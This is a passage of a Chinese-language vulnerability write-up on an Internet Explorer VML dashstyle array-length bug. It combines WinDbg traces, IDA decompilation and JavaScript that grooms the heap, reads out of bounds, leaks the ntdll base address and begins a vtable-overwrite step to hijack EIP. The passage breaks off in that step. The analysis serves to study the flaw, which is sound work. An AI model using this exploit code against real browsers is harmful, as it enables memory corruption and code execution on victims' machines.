ebx=70a84964 ecx=70a17258 edx=0473bd24 esi=1b398ff0 edi=0473c2f4</span><br><span class="line">eip=70a2d081 esp=0473bd2c ebp=0473bd2c iopl=0         nv up ei pl nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213</span><br><span class="line">vgx!ORG::CElements+0x8:</span><br><span class="line">70a2d081 0fb74004        movzx   eax,word ptr [eax+4]     ds:0023:1b190fec=ffff</span><br></pre></td></tr></table></figure><p></p><p>可以看到，代码从一个<code>vgx!ORG</code>对象中取出了<code>0xffff</code>，其中<code>movzx</code>说明是将其作为无符号数对待的。<br>当函数返回后，<code>0xffff</code>将会和<code>a2</code>进行比较，但此时是有符号数比较，导致<code>0xffff &lt; a2</code>，从而调用<code>vgx!ORG::Get</code></p><p>根据POC中的代码，我们很容易猜到<code>0xffff</code>就是dashstyle数组（ORG数组）的长度，而<code>vml1.dashstyle.array.length = 0 - 1;</code>就是对长度进行修改的代码。</p><p>此时我们已经大概了解的这个漏洞的原理，但还是没有追溯到修改数组长度的根源。接下来我们将要试图找到修改length的具体代码。</p><h2 id="漏洞根源"><a href="#漏洞根源" class="headerlink" title="漏洞根源"></a>漏洞根源</h2><p>因为在c++在创建对象的时候，会将对象的虚表地址拷贝到对象的内存中，所以我们在代码中搜索对<code>vgx!ORG::&#39;vftable&#39;</code>的引用，试图找到创建<code>vgx!ORG</code>对象的代码。<br><img src="/post/ef2727d8/search1.png" alt="search1.png"><br><img src="/post/ef2727d8/search2.png" alt="search2.png"><br>可以看到，除了虚表本身以及两个<code>ORG</code>对象的成员函数外，只剩一个函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">MsoFCreateArray</span><span class="params">(__int16 a1, _DWORD *a2)</span></span>;</span><br></pre></td></tr></table></figure><p></p><p>在windbg中对其下断点<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; bp vgx!MsoFCreateArray</span><br><span class="line">0:016&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=0485e9c8 ebx=0485ea30 ecx=0485ea30 edx=00000001 esi=0485ea34 edi=0485ea30</span><br><span class="line">eip=6e90d1df esp=0485e99c ebp=0485e9b0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!MsoFCreateArray:</span><br><span class="line">6e90d1df 8bff            mov     edi,edi</span><br><span class="line">...                                      //单步几次后</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=0485e9c8 ebx=0485ea30 ecx=0485ea30 edx=00000001 esi=0485ea34 edi=00000101</span><br><span class="line">eip=6e90d1ee esp=0485e988 ebp=0485e998 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!MsoFCreateArray+0xf:</span><br><span class="line">6e90d1ee e88a67fdff      call    vgx!operator new (6e8e397d)</span><br><span class="line">0:005&gt; p</span><br><span class="line">eax=1d66efe8 ebx=0485ea30 ecx=00000014 edx=00000000 esi=0485ea34 edi=00000101</span><br><span class="line">eip=6e90d1f3 esp=0485e988 ebp=0485e998 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vgx!MsoFCreateArray+0x14:</span><br><span class="line">6e90d1f3 59              pop     ecx</span><br><span class="line">0:005&gt; dd eax l8</span><br><span class="line">1d66efe8  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">1d66eff8  c0c0c0c0 d0d0d0d0 ???????? ????????</span><br></pre></td></tr></table></figure><p></p><p>可以发现这里创建了一个<code>vgx!ORG</code>对象，我们对它的length所在地址下内存断点，来观察其值的变化。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; ba w2 eax+4</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">eax=1d66efec ebx=0485ea30 ecx=00000000 edx=00000004 esi=1d66efe8 edi=00000101</span><br><span class="line">eip=6e94c07e esp=0485e978 ebp=0485e978 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vgx!MsoFInitPx+0x11:</span><br><span class="line">6e94c07e 8b4d14          mov     ecx,dword ptr [ebp+14h] ss:0023:0485e98c=00000101</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 00040001 00040004 00000101</span><br><span class="line">1d66eff8  1d670ff0 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 00040002 00040004 00000101</span><br><span class="line">1d66eff8  1d670ff0 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 00040003 00040004 00000101</span><br><span class="line">1d66eff8  1d670ff0 d0d0d0d0 ???????? ????????</span><br><span class="line">...</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 002c002c 00040004 00000101</span><br><span class="line">1d66eff8  1cbe2f50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; g; dd 1d66efe8 l8</span><br><span class="line">Breakpoint 8 hit</span><br><span class="line">1d66efe8  6e8f7258 002cffff 00040004 00000101</span><br><span class="line">1d66eff8  1cbe2f50 d0d0d0d0 ???????? ????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0485ee34 6e94c7c6 1d66efec ffffffff 0000002d vgx!MsoFRemovePx+0xaa</span><br><span class="line">0485ee4c 6e90cf79 1d66efec ffffffff 0000002d vgx!MsoDeletePx+0x15</span><br><span class="line">0485ee60 6e95dbac 1d66efe8 ffffffff 0000002d vgx!ORG::DeleteRange+0x17</span><br><span class="line">0485ee8c 764a3ec3 1d66efe8 ffffffff 0793efa4 vgx!COALineDashStyleArray::put_length+0xd7</span><br><span class="line">0485eea8 764a3d3d 1d896ff0 00000030 00000004 OLEAUT32!DispCallFunc+0x165</span><br><span class="line">0485ef38 6e9447c1 07e4b454 1d896ff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f</span><br></pre></td></tr></table></figure><p></p><p>可以看到，length的值首先从<code>0</code>递增到<code>0x2c</code>，然后被修改为了<code>0xffff</code><br>通过栈回溯可以注意到<code>vgx!COALineDashStyleArray::put_length</code>函数，从函数名就可以猜测到这是一个修改length值的函数。<br>重新运行，对该函数下断<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:015&gt; bp vgx!COALineDashStyleArray::put_length</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 7 hit</span><br><span class="line">eax=0000000a ebx=70a84964 ecx=70a7dad5 edx=09648fea esi=06297ec0 edi=046deca4</span><br><span class="line">eip=70a7dad5 esp=046dec58 ebp=046dec70 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vgx!COALineDashStyleArray::put_length:</span><br><span class="line">70a7dad5 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd esp l4</span><br><span class="line">046dec58  764a3ec3 1d958ff0 ffffffff 09648fa4</span><br></pre></td></tr></table></figure><p></p><p>同时使用IDA查看函数代码<br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __stdcall COALineDashStyleArray::put_length(struct COAProg **<span class="keyword">this</span>, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( v10 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    v7 = (*(*<span class="keyword">this</span> + <span class="number">11</span>))(<span class="keyword">this</span>);     <span class="comment">//vgx!ORG::CElements()</span></span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt;= a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(*<span class="keyword">this</span> + <span class="number">10</span>))(<span class="keyword">this</span>, a2, v7 - a2);   <span class="comment">//vgx!ORG::DeleteRange(ORG *this, int a2, int a3)</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = a2 - v7;</span><br><span class="line">    v9 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">4</span> * (a2 - v7));</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">4</span> * v8);</span><br><span class="line">    <span class="keyword">if</span> ( !(*(*<span class="keyword">this</span> + <span class="number">6</span>))(<span class="keyword">this</span>, v9, v8) )    <span class="comment">//vgx!ORG::FAppendRange(int a1, void *Src, int a3)</span></span><br><span class="line">        v10 = <span class="number">0x80004005</span>;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v9)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_2:</span><br><span class="line">  v3 = v10;</span><br><span class="line">  COAError::~COAError(&amp;v10);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>首先通过调试可以知道，参数a2的值为0xffffffff，也就是我们想要设置的length。ida中的几个函数指针分别为如上所示。<br>通过ida反编译的代码我们就可以将整个程序逻辑理解清楚了。</p><ol><li>首先使用<code>vgx!ORG::CElements()</code>获取当前的长度值(<code>0x2c</code>)，放入<code>v7</code>中</li><li><code>v7</code>与参数<code>a2</code>进行比较，这里同样也是有符号数的比较，<code>v7 &gt; a2</code></li><li>调用<code>ORG::DeleteRange</code>并直接跳转到<code>LABEL_2</code>，退出函数</li></ol><p>而程序的正常流程本应该为</p><ol><li><code>v7 &lt; v2</code>，</li><li>重新分配内存<code>v9 = operator new(4 * (a2 - v7))</code></li><li>调用<code>ORG::FAppendRange</code>函数，并退出函数。</li></ol><p>到此，我们完成了对poc触发crash完整流程的分析。</p><h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><blockquote><p>此时注意关闭hpa选项</p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>这里参考了<a href="http://www.cnblogs.com/Danny-Wei/p/3766432.html" target="_blank" rel="noopener">Danny__Wei</a>的博客</p><blockquote><ol><li><code>VML shape</code>的<code>_vgRuntimeStyle</code>属性由<code>COARuntimeStyle</code>对象负责处理，当访问<code>_vgRuntimeStyle.marginLeft</code>时，对应的<code>COARuntimeStyle::put_marginLeft()</code>或者<code>COARuntimeStyle::get_marginLeft()</code>函数就会被调用</li><li>当第一次访问<code>marginLeft/rotation</code>属性，那么在<code>put_marginLeft/put_rotation</code>函数中会调用<code>CVMLShape::GetRTSInfo -&gt; CParserTag::GetRTSInfo</code>来创建一个<code>COARuntimeStyle</code>对象，该对象大小为0xAC（实际分配0xB0）</li><li>而<code>marginLeft</code>属性的值对应的字符串指针就保存在该<code>COARuntimeStyle</code>对象的0x58偏移处。可以通过<code>get_marginLeft</code>函数来访问该属性</li></ol></blockquote><p>因为我们拥有让<code>dashstyle</code>数组（ORG数组）越界访问的能力<br>那么，如果可以将<code>COARuntimeStyle</code>对象布局到一个<code>dashstyle</code>数组后方，我们就可以修改其中的<code>marginLeft</code>值对应的字符串指针。<br>这样，当我们再次读取<code>marginLeft</code>值的时候，就可以任意地址读取了。</p><h3 id="相关代码"><a href="#相关代码" class="headerlink" title="相关代码"></a>相关代码</h3><p>为了达到这样的效果，我们这里首先创建大量的<code>VML shape</code>对象<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        rect_array[i]    = <span class="built_in">document</span>.createElement(<span class="string">"v:shape"</span>)</span><br><span class="line">        rect_array[i].id = <span class="string">"rect"</span> + i.toString()</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(rect_array[i])</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>然后依次访问<code>_vgRuntimeStyle.rotation</code>，以此来创建大量的<code>COARuntimeStyle</code>对象(<code>0xB0字节</code>)<br>并且在创建的中途创建一个包含44个元素的<code>dashstyle数组</code>（ORG数组），该数组大小与<code>COARuntimeStyle</code>对象一致，使之可以与其相邻。<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span><br><span class="line">    a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;  <span class="comment">//获取_vgRuntimeStyle属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span><br><span class="line">    a[i].rotation;  <span class="comment">//第一次访问rotation属性，创建COARuntimeStyle对象 大小为0xAC(0xB0) 在偏移为0x58处为marginLeft</span></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;   <span class="comment">//在COARuntimeStyle中间创建一个包含44个元素的dashstyle数组（ORG数组），分配4*44 = 0xb0大小的空间</span></span><br><span class="line">    vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在布局成功后，越界访问修改<code>marginLeft</code>指针(偏移为<code>0x16*4=0x58</code>)，然后再次读取<code>marginLeft</code>，从而泄露数据。这里选择通过固定地址<code>0x7ffe0300</code>泄露出<code>ntdll.dll</code>的基址。<br>通过固定地址泄露的方法在后期补丁之后无法利用，可以选择泄露<code>COARuntimeStyle</code>对象的虚表指针从而计算出<code>vgx.dll</code>基址,然后通过读取<code>PE头</code>来获取<code>IAT</code>表来得到<code>ntdll.dll</code>的基址，具体可参考<a href="https://www.4hou.com/technology/4241.html" target="_blank" rel="noopener">文章</a><br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span><br><span class="line">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>;  <span class="comment">//修改length</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;  </span><br><span class="line">    marginLeftAddress_orgin = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>); <span class="comment">//0x2E = dashstyle长度 + COARuntimeStyle对象堆块头部(8字节)</span></span><br><span class="line">    a[i].marginLeft = <span class="string">"hpasserby"</span></span><br><span class="line">    marginLeftAddress_modify = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br><span class="line">    <span class="keyword">if</span> (marginLeftAddress_orgin != marginLeftAddress_modify) &#123;  <span class="comment">//判断该对象是否紧邻于dashstyle数组</span></span><br><span class="line">        vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = <span class="number">0x7ffe0300</span>;  <span class="comment">//修改指针</span></span><br><span class="line">        <span class="keyword">var</span> leak = a[i].marginLeft;</span><br><span class="line">        ntdllbase = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>) - <span class="number">0x464F0</span>;</span><br><span class="line">        alert(<span class="string">"ntdllbase: 0x"</span> + ntdllbase.toString(<span class="number">16</span>));</span><br><span class="line">        vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = marginLeftAddress_orgin;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h3 id="调试笔记"><a href="#调试笔记" class="headerlink" title="调试笔记"></a>调试笔记</h3><p>首先在<code>vgx!MsoFCreateArray</code>下断，查看<code>vgx!ORG</code>对象的地址，然后运行到<code>vgx!COARuntimeStyle::put_marginLeft</code><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bu vgx!MsoFCreateArray+0x14</span><br><span class="line">0:005&gt; bu vgx!COARuntimeStyle::put_marginLeft</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=03f02690 ebx=0265e5d8 ecx=00000014 edx=02040048 esi=0265e5dc edi=00000101</span><br><span class="line">eip=6d82d1f3 esp=0265e530 ebp=0265e540 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vgx!MsoFCreateArray+0x14:</span><br><span class="line">6d82d1f3 59              pop     ecx</span><br><span class="line">0:005&gt; dd 3f02690 l8</span><br><span class="line">03f02690  000001c6 00000000 00000000 00000000</span><br><span class="line">03f026a0  00000000 00000000 2156f9af 80000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=0000000a ebx=6d8852d0 ecx=6d880286 edx=001493e2 esi=0265ed48 edi=0265ea84</span><br><span class="line">eip=6d880286 esp=0265ea38 ebp=0265ea50 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vgx!COARuntimeStyle::put_marginLeft:</span><br><span class="line">6d880286 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd 3f02690 l8</span><br><span class="line">03f02690  6d817258 002cffff 00040004 00000101</span><br><span class="line">03f026a0  03f32b80 00000000 2156f9af 80000000</span><br><span class="line">0:005&gt; dd 03f32b80 l100</span><br><span class="line">03f32b80  00000001 00000002 00000003 00000004</span><br><span class="line">03f32b90  00000005 00000006 00000007 00000008</span><br><span class="line">03f32ba0  00000009 0000000a 0000000b 0000000c</span><br><span class="line">03f32bb0  0000000d 0000000e 0000000f 00000010</span><br><span class="line">03f32bc0  00000011 00000012 00000013 00000014</span><br><span class="line">03f32bd0  00000015 00000016 00000017 00000018</span><br><span class="line">03f32be0  00000019 0000001a 0000001b 0000001c</span><br><span class="line">03f32bf0  0000001d 0000001e 0000001f 00000020</span><br><span class="line">03f32c00  00000021 00000022 00000023 00000024</span><br><span class="line">03f32c10  00000025 00000026 00000027 00000028</span><br><span class="line">03f32c20  00000029 0000002a 0000002b 0000002c</span><br><span class="line">03f32c30  214948dc 8c000000 01400018 00000000</span><br><span class="line">03f32c40  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c50  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c60  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c70  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c80  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c90  00000000 00000000 00000000 00000000</span><br><span class="line">03f32ca0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32cb0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32cc0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32cd0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32ce0  00000001 00000000 214948c7 8c000000</span><br><span class="line">03f32cf0  01400018 00000000 00000000 00000000</span><br><span class="line">03f32d00  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d10  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d20  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d30  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d40  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d50  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d60  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d70  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d80  00000000 00000000 00000000 00000000</span><br><span class="line">03f32d90  00000000 00000000 00000001 00000000</span><br><span class="line">03f32da0  214948ee 8c000000 01400018 00000000</span><br><span class="line">03f32db0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32dc0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32dd0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32de0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32df0  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e00  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e10  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e20  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e30  00000000 00000000 00000000 00000000</span><br><span class="line">03f32e40  00000000 00000000 00000000 00000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p></p><p>可以观察到数组后方已经成功布局上了<code>COARuntimeStyle</code>对象<br>继续运行，浏览器弹窗时断下，查看内存<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 03f32b80 l100</span><br><span class="line">03f32b80  00000001 00000002 00000003 00000004</span><br><span class="line">03f32b90  00000005 00000006 00000007 00000008</span><br><span class="line">03f32ba0  00000009 0000000a 0000000b 0000000c</span><br><span class="line">03f32bb0  0000000d 0000000e 0000000f 00000010</span><br><span class="line">03f32bc0  00000011 00000012 00000013 00000014</span><br><span class="line">03f32bd0  00000015 00000016 00000017 00000018</span><br><span class="line">03f32be0  00000019 0000001a 0000001b 0000001c</span><br><span class="line">03f32bf0  0000001d 0000001e 0000001f 00000020</span><br><span class="line">03f32c00  00000021 00000022 00000023 00000024</span><br><span class="line">03f32c10  00000025 00000026 00000027 00000028</span><br><span class="line">03f32c20  00000029 0000002a 0000002b 0000002c</span><br><span class="line">03f32c30  214948dc 8c000000 01400018 00000000</span><br><span class="line">03f32c40  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c50  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c60  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c70  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c80  00000000 00000000 00000000 00000000</span><br><span class="line">03f32c90  7ffe0300 00000000 00000000 00000000</span><br><span class="line">03f32ca0  00000000 00000000 00000000 00000000</span><br><span class="line">0:008&gt; ln poi(7ffe0300) </span><br><span class="line">(778d64f0)   ntdll!KiFastSystemCall   |  (778d64f4)   ntdll!KiFastSystemCallRet</span><br><span class="line">Exact matches:</span><br><span class="line">    ntdll!KiFastSystemCall (&lt;no parameter info&gt;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p></p><p>可见地址<code>0x03f32c90</code>处的地址已经被修改为<code>7ffe0300</code>，通过获取<code>marginLeft</code>就可读取处ntdll.dll中的地址。<br><img src="/post/ef2727d8/ntdll.png" alt="ntdll.png"></p><h2 id="劫持eip"><a href="#劫持eip" class="headerlink" title="劫持eip"></a>劫持eip</h2><blockquote><ol><li>当读取_anchorRect属性时，内部会调用”vgx!COAShape::get__anchorRect()”，最终创建并返回一个0x10大小的COAReturnedPointsForAnchor对象。</li><li>释放_anchorRec元素时，会调用虚表函数<br>所以，我们可以通过与前面相同得布局方式，通过溢出修改<code>COAReturnedPointsForAnchor</code>对象的虚表指针，从而在释放该对象时获取程序控制权。</li></ol></blockquote><h3 id="相关代码-1"><a href="#相关代码-1" class="headerlink" title="相关代码"></a>相关代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 